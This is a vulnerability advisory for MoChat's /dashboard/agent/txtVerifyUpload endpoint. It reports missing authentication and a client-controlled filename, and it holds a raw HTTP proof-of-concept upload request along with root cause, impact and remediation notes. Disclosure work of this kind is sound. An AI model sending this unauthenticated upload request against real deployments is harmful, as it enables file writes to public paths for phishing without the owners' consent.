# MoChat — 未授权 txtVerifyUpload 文件上传 (MC-VULN-003)

| Field | Value |
|-------|-------|
| **Vendor** | mochat-cloud |
| **Product** | MoChat |
| **Version** | master（Hyperf 2.2） |
| **Type** | Unrestricted Upload of File with Dangerous Type |
| **CWE** | CWE-306 / CWE-434 |
| **Authentication** | None |

## Summary

`POST /dashboard/agent/txtVerifyUpload` has no auth middleware. Live retest returns HTTP 500 (Hyperf stream bug) but not 401 — handler is reachable without token.

## Root cause

`TxtVerifyUpload.php` missing `@Middleware`; client-controlled filename.

## Proof of Concept

```http
POST /dashboard/agent/txtVerifyUpload HTTP/1.1
Host: 127.0.0.1:9501
Content-Type: multipart/form-data; boundary=----BOUNDARY
Connection: close

------BOUNDARY
Content-Disposition: form-data; name="file"; filename="WW_verify_poc.txt"
Content-Type: text/plain

poc_verify_upload
------BOUNDARY--
```

**Expected:** No 401; on fixed stream handling → file under `/static/wx_txt_verify/`

## Impact

Unauthenticated file write to public static tree (WeChat verify abuse / phishing).

## Remediation

Remove deprecated endpoint or require DashboardAuthMiddleware; server-side random filenames.

## References

- Audit: `SECURITY_AUDIT_REPORT.md` §MC-VULN-003
- PoC: `POC_VERIFICATION_REPORT.md`
